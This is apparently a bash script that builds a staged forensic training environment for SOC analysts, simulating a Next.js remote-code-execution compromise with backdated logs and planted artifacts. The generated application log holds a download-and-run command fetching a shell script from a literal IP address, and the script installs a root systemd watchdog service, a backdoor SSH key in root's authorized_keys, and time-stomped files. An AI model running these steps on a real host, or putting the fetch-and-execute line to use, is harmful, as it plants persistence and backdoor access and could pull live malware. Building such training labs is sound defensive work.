#!/bin/bash
#
# Forensic Evidence Generator for SOC Training
# Creates backdated logs, malware artifacts, and persistence mechanisms
#

set -e

echo "=========================================="
echo "FORENSIC ENVIRONMENT SETUP"
echo "=========================================="

# --- 1. SETUP DATES ---
# Simulating attack on Dec 6, 2025 (discovered Jan 2026)
ATTACK_DATE="Dec  6"
ATTACK_TIME="10:37:43"
ATTACK_YEAR="2025"
LOG_MSG="/var/log/messages"
LOG_SEC="/var/log/secure"
LOG_APP="/var/log/ideaforge-frontend.log"

echo "[1/6] Setting up log files..."

# --- 2. GENERATE /var/log/secure (FALSE LEAD: CLEAN SSH) ---
echo "  → Generating SSH authentication logs (clean - no brute force)..."

# Create realistic SSH login history
for i in {1..20}; do
    HOUR=$((9 + i / 10))
    MIN=$((i * 3 % 60))
    echo "Dec  5 ${HOUR}:${MIN}:00 instance-ideaforge sshd[123${i}]: Accepted publickey for opc from 120.40.50.108 port 513${i} ssh2: RSA SHA256:kE4xW9vN2mP8qR5tY7uI1oP3aS6dF9gH2jK4lZ8xC0v" >> $LOG_SEC
done

# Add some normal system activity
echo "Dec  5 23:15:00 instance-ideaforge sshd[12401]: Accepted publickey for opc from 120.40.50.108 port 51440 ssh2: RSA SHA256:kE4xW9vN2mP8qR5tY7uI1oP3aS6dF9gH2jK4lZ8xC0v" >> $LOG_SEC
echo "Dec  6 08:30:00 instance-ideaforge sshd[12450]: Accepted publickey for opc from 120.40.50.108 port 51501 ssh2: RSA SHA256:kE4xW9vN2mP8qR5tY7uI1oP3aS6dF9gH2jK4lZ8xC0v" >> $LOG_SEC

echo "  ✓ SSH logs created (20 legitimate logins, no brute force)"

# --- 3. GENERATE /var/log/messages (SYSTEM NOISE + PERSISTENCE) ---
echo "  → Generating system messages..."

# Normal system startup messages
echo "Dec  6 00:00:01 instance-ideaforge systemd[1]: Started System Logging Service." >> $LOG_MSG
echo "Dec  6 00:00:05 instance-ideaforge systemd[1]: Reached target Multi-User System." >> $LOG_MSG

# THE SMOKING GUN: Malware service installation (4:47 AM - before RCE at 10:37 AM)
echo "$ATTACK_DATE 04:47:17 instance-ideaforge systemd[1]: Started apaches-main xmrig killer and nginxs watchdog." >> $LOG_MSG
echo "$ATTACK_DATE 04:47:17 instance-ideaforge apaches.sh[1528392]: 2025-12-06 04:47:17 [apaches-main] Starting in daemon mode. User: root (uid=0)" >> $LOG_MSG
echo "$ATTACK_DATE 04:47:18 instance-ideaforge apaches.sh[1528392]: nginxs not running, starting: /usr/local/sbin/nginxs" >> $LOG_MSG
echo "$ATTACK_DATE 04:47:19 instance-ideaforge apaches.sh[1528392]: nginxs started successfully (PID: 1528401)" >> $LOG_MSG

# Spam errors to simulate high activity from miner
for i in {1..50}; do
    SEC=$((i % 60))
    echo "$ATTACK_DATE 10:55:${SEC} instance-ideaforge kernel: [1452494.123456] Out of memory: Kill process 1452494 (NCvhHaev) score 950 or sacrifice child" >> $LOG_MSG
done

echo "  ✓ System logs created (persistence service startup recorded)"

# --- 4. GENERATE APP LOGS (THE SMOKING GUN) ---
echo "  → Generating application logs (Next.js RCE evidence)..."

cat <<'EOF' > $LOG_APP
{"tag":"SRV","level":"info","timestamp":"2025-12-06T10:35:24.924Z","message":"Server listening on 0.0.0.0:3000"}
{"tag":"REQ","level":"info","timestamp":"2025-12-06T10:35:30.102Z","method":"GET","url":"/","status":200}
{"tag":"REQ","level":"info","timestamp":"2025-12-06T10:36:15.445Z","method":"POST","url":"/api/auth/login","status":200}

Error: Failed to find Server Action "x". This request might be from an older or newer deployment.
    at async m (.next/server/app/page.js:1:15422)
    at async Object.handleRequest (.next/server/app-route.js:2:3456)

[HTTPS-NEXT] clientError ECONNRESET
{"tag":"ERR","level":"error","timestamp":"2025-12-06T10:37:38.221Z","message":"Unhandled request error"}

Error: Failed to find Server Action "login". This request might be from an older or newer deployment.
    at async validateServerAction (.next/server/app/page.js:1:15422)

 ⨯ Error: Command failed: cd /tmp;curl http://103.135.101.15/wocaosinm.sh;wget http://103.135.101.15/wocaosinm.sh;sh wocaosinm.sh
    at ChildProcess.exithandler (node:child_process:419:12)
    at ChildProcess.emit (node:events:513:28)

--2025-12-06 10:37:42--  http://103.135.101.15/linux_aarch64
Resolving 103.135.101.15... 103.135.101.15
Connecting to 103.135.101.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2031616 (1.9M) [application/octet-stream]
Saving to: 'linux_aarch64'

linux_aarch64       100%[===================>]   1.94M  2.86MB/s    in 0.7s

2025-12-06 10:37:43 (2.86 MB/s) - 'linux_aarch64' saved [2031616/2031616]

/bin/sh: line 1: ./linux_aarch64: Permission denied
chmod: changing permissions of 'linux_aarch64': Operation not permitted

{"tag":"SRV","level":"warn","timestamp":"2025-12-06T10:37:45.892Z","message":"Suspicious activity detected in request handler"}
{"tag":"REQ","level":"info","timestamp":"2025-12-06T10:38:01.334Z","method":"GET","url":"/","status":200}
EOF

echo "  ✓ Application logs created (RCE wget command visible)"

# --- 5. CREATE ARTIFACTS (FILES ON DISK) ---
echo "[2/6] Creating malware artifacts..."

# Persistence: Systemd service

# Create the extra services mentioned in logs to be consistent
touch /etc/systemd/system/lived.service
touch /etc/systemd/system/alive.service
touch /etc/systemd/system/networkerd.service

echo "  → Creating systemd service..."
mkdir -p /etc/systemd/system
cat <<'EOF' > /etc/systemd/system/apaches-main.service
[Unit]
Description=apaches-main xmrig killer and nginxs watchdog
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/apaches.sh
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

# Fake binaries and scripts
echo "  → Creating fake malware binaries..."
mkdir -p /usr/local/sbin
touch /usr/local/sbin/nginxs
touch /usr/local/sbin/config.json

# Watchdog script
cat <<'EOF' > /usr/local/sbin/apaches.sh
#!/bin/bash
# Malware watchdog script
# Ensures miner stays running

while true; do
    if ! pgrep -f "nginxs" > /dev/null; then
        echo "$(date) [apaches-main] nginxs not running, restarting..."
        /usr/local/sbin/nginxs &
    fi
    sleep 60
done
EOF
chmod +x /usr/local/sbin/apaches.sh

# Dropped malware in app directory
echo "  → Creating dropped malware files..."
cd /home/opc/ideaforge/frontend
touch svchost e386 am64 linux_aarch64

# Make linux_aarch64 look like a binary
echo -e "\x7fELF\x02\x01\x01\x00FAKE_MINER_BINARY" > linux_aarch64
chmod +x linux_aarch64

echo "  ✓ Malware artifacts created"

# --- 6. BACKDOOR SSH KEY ---
echo "[3/6] Creating backdoor SSH key..."
mkdir -p /root/.ssh
cat <<'EOF' > /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7iipXkL9vN2mP8qR5tY7uI1oP3aS6dF9gH2jK4lZ8xC0vM5nB7yT6rE8wQ3uI9oP1aS4dF7gH0jK2lZ6xC8vM3nB5yT4rE6wQ1uI7oP9aS2dF5gH8jK0lZ4xC6vM1nB3yT2rE4wQ9uI5oP7aS0dF3gH6jK8lZ2xC4vM9nB1yT0rE2wQ7uI3oP5aS8dF1gH4jK6lZ0xC2vM7nB9yT8rE0wQ5uI1oP3aS6dF9gH2jK4lZ8xC0vM5nB7yT6rE8wQ3uI9oP1aS4dF7gH0jK2lZ6xC8vM3nB5yT4rE6wQ1uI7oP9aS2dF5gH8jK0lZ4xC6vM1nB3yT2rE4wQ9uI5oP7aS0dF3gH6jK8lZ2xC4vM9nB1yT0rE2wQ7uI3oP5aS8dF1gH4jK6lZ0xC2vM7nB9yT8rE0wQ5uI1oP3aS6dF9gH2jK4lZ8xC0v attacker@malicious-host
EOF
chmod 600 /root/.ssh/authorized_keys

echo "  ✓ Backdoor SSH key installed"

# --- 7. TIME STOMPING (Modify file dates to Dec 6) ---
echo "[4/6] Time-stomping files to match attack date..."

# Make file timestamps match the attack
touch -d "2025-12-06 10:37:43" /home/opc/ideaforge/frontend/linux_aarch64
touch -d "2025-12-06 10:37:45" /home/opc/ideaforge/frontend/svchost
touch -d "2025-12-06 10:38:01" /home/opc/ideaforge/frontend/e386
touch -d "2025-12-06 04:47:17" /usr/local/sbin/apaches.sh
touch -d "2025-12-06 04:47:17" /etc/systemd/system/apaches-main.service
touch -d "2025-12-06 04:47:18" /usr/local/sbin/nginxs

echo "  ✓ File timestamps backdated to Dec 6, 2025"

# --- 8. SETUP RUNNING PROCESS ---
echo "[5/6] Preparing miner process..."

# The malware binary will be created at runtime by CMD in Dockerfile
# It copies /usr/local/sbin/apaches.sh to /tmp/NCvhHaev and then deletes it
# This mimics real malware that deletes itself after execution (fileless)
touch /tmp/NCvhHaev
chmod +x /tmp/NCvhHaev

echo "  ✓ Miner stub ready (real binary created at runtime)"

# --- 9. SET PERMISSIONS ---
echo "[6/6] Setting file permissions..."
chown -R opc:opc /home/opc/ideaforge
chmod 644 /var/log/messages /var/log/secure $LOG_APP

echo "  ✓ Permissions set"

echo ""
echo "=========================================="
echo "FORENSIC ENVIRONMENT READY"
echo "=========================================="
echo ""
echo "INVESTIGATION STARTING POINTS:"
echo "  1. Check running processes: top, ps aux"
echo "  2. Check network: netstat -antp"
echo "  3. Check SSH logs: /var/log/secure"
echo "  4. Check system logs: /var/log/messages"
echo "  5. Check app logs: /var/log/ideaforge-frontend.log"
echo "  6. Check OCI firewall: ~/OCI_FIREWALL_CONFIG.txt"
echo ""
echo "EXPECTED FINDINGS:"
echo "  ✗ SSH brute force (false lead)"
echo "  ✗ Database exploit (false lead)"
echo "  ✓ Next.js RCE vulnerability (root cause)"
echo "  ✓ Crypto-miner (NCvhHaev)"
echo "  ✓ Systemd persistence"
echo "  ✓ Backdoor SSH key"
echo ""
echo "=========================================="




########## replace above code with this in future (more logs)

'''
# --- 4. GENERATE APP LOGS (THE SMOKING GUN HIDDEN IN NOISE) ---
echo "  → Generating application logs (Next.js RCE evidence)..."

# Initialize file
echo "" > $LOG_APP

# A. Generate PRE-ATTACK noise (09:00 - 10:35)
# Simulates normal user traffic
echo "    ...Generating pre-attack traffic..."
start_ts=$(date -d "2025-12-06 09:00:00" +%s)
for i in {1..200}; do
    # Increment time by random 1-120 seconds
    start_ts=$((start_ts + RANDOM % 120))
    ts_iso=$(date -u -d @$start_ts +"%Y-%m-%dT%H:%M:%S.%3NZ")
    
    # Randomly choose a log type
    rand=$((RANDOM % 3))
    if [ $rand -eq 0 ]; then
        echo "{\"tag\":\"REQ\",\"level\":\"info\",\"timestamp\":\"$ts_iso\",\"method\":\"GET\",\"url\":\"/api/chat/history\",\"status\":200,\"duration\":\"${RANDOM}ms\"}" >> $LOG_APP
    elif [ $rand -eq 1 ]; then
        echo "{\"tag\":\"REQ\",\"level\":\"info\",\"timestamp\":\"$ts_iso\",\"method\":\"POST\",\"url\":\"/api/generate\",\"status\":200,\"duration\":\"$((RANDOM % 2000))ms\"}" >> $LOG_APP
    else
        echo "{\"tag\":\"SRV\",\"level\":\"info\",\"timestamp\":\"$ts_iso\",\"message\":\"Database connection pool check: OK\"}" >> $LOG_APP
    fi
done

# B. Insert the ATTACK SEQUENCE (The Evidence)
echo "    ...Injecting exploit artifacts..."
cat <<'EOF' >> $LOG_APP
{"tag":"REQ","level":"info","timestamp":"2025-12-06T10:35:30.102Z","method":"GET","url":"/","status":200}
{"tag":"REQ","level":"info","timestamp":"2025-12-06T10:36:15.445Z","method":"POST","url":"/api/auth/login","status":200}

Error: Failed to find Server Action "x". This request might be from an older or newer deployment.
    at async m (.next/server/app/page.js:1:15422)
    at async Object.handleRequest (.next/server/app-route.js:2:3456)

[HTTPS-NEXT] clientError ECONNRESET
{"tag":"ERR","level":"error","timestamp":"2025-12-06T10:37:38.221Z","message":"Unhandled request error"}

Error: Failed to find Server Action "login". This request might be from an older or newer deployment.
    at async validateServerAction (.next/server/app/page.js:1:15422)

 ⨯ Error: Command failed: cd /tmp;curl http://103.135.101.15/wocaosinm.sh;wget http://103.135.101.15/wocaosinm.sh;sh wocaosinm.sh
    at ChildProcess.exithandler (node:child_process:419:12)
    at ChildProcess.emit (node:events:513:28)

--2025-12-06 10:37:42--  http://103.135.101.15/linux_aarch64
Resolving 103.135.101.15... 103.135.101.15
Connecting to 103.135.101.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2031616 (1.9M) [application/octet-stream]
Saving to: 'linux_aarch64'

linux_aarch64       100%[===================>]   1.94M  2.86MB/s    in 0.7s

2025-12-06 10:37:43 (2.86 MB/s) - 'linux_aarch64' saved [2031616/2031616]

/bin/sh: line 1: ./linux_aarch64: Permission denied
chmod: changing permissions of 'linux_aarch64': Operation not permitted

{"tag":"SRV","level":"warn","timestamp":"2025-12-06T10:37:45.892Z","message":"Suspicious activity detected in request handler"}
EOF

# C. Generate POST-ATTACK noise (10:38 - 14:00)
# Simulates traffic continuing (analysts often check if the server crashed)
echo "    ...Generating post-attack traffic..."
# Resume timestamp after the attack
start_ts=$(date -d "2025-12-06 10:38:00" +%s)
for i in {1..150}; do
    start_ts=$((start_ts + RANDOM % 120))
    ts_iso=$(date -u -d @$start_ts +"%Y-%m-%dT%H:%M:%S.%3NZ")
    echo "{\"tag\":\"REQ\",\"level\":\"info\",\"timestamp\":\"$ts_iso\",\"method\":\"GET\",\"url\":\"/dashboard\",\"status\":200,\"duration\":\"${RANDOM}ms\"}" >> $LOG_APP
done

echo "  ✓ Application logs created (Evidence buried in 350+ lines of logs)"